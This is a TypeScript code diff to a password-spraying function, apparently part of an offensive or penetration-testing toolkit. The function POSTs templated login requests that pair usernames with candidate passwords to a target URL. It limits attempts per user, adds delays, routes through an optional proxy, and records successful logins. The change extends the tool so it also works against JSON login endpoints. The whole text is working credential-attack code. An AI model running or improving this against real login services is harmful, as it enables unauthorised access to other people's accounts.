@@ -62,6 +62,8 @@ const sleep = (ms: number): Promise<void> => new Promise((r) => setTimeout(r, ms
 export const sprayPasswords = async (input: SprayInput): Promise<SprayResult> => {
   const ct = input.contentType ?? (input.bodyTemplate.trim().startsWith("{") ? "application/json" : "application/x-www-form-urlencoded");
   const headers = (): Record<string, string> => ({ "content-type": ct, ...(input.headers ?? {}) });
+  const isJson = ct.includes("json");
+  const enc = (v: string): string => (isJson ? v : encodeURIComponent(v));
   const perUser = Math.max(1, input.maxPerUser ?? 3);
   const delay = Math.max(0, input.delayMs ?? 250);
   const hits: SprayHit[] = [];
@@ -74,7 +76,7 @@ export const sprayPasswords = async (input: SprayInput): Promise<SprayResult> =>
     let attempts = 0;
     for (const pass of input.passwords) {
       if (attempts >= perUser) break;
-      const body = input.bodyTemplate.replaceAll("{USER}", encodeURIComponent(user)).replaceAll("{EMAIL}", encodeURIComponent(user)).replaceAll("{PASS}", encodeURIComponent(pass));
+      const body = input.bodyTemplate.replaceAll("{USER}", enc(user)).replaceAll("{EMAIL}", enc(user)).replaceAll("{PASS}", enc(pass));
       const r = await fetchUrl(input.url, { method: "POST", body, headers: headers(), maxAttempts: 1, redirect: "manual", proxy: input.proxy, timeoutMs: input.timeoutMs ?? 10_000, maxBytes: 256 * 1024 });
       attempts++;
       tried++;
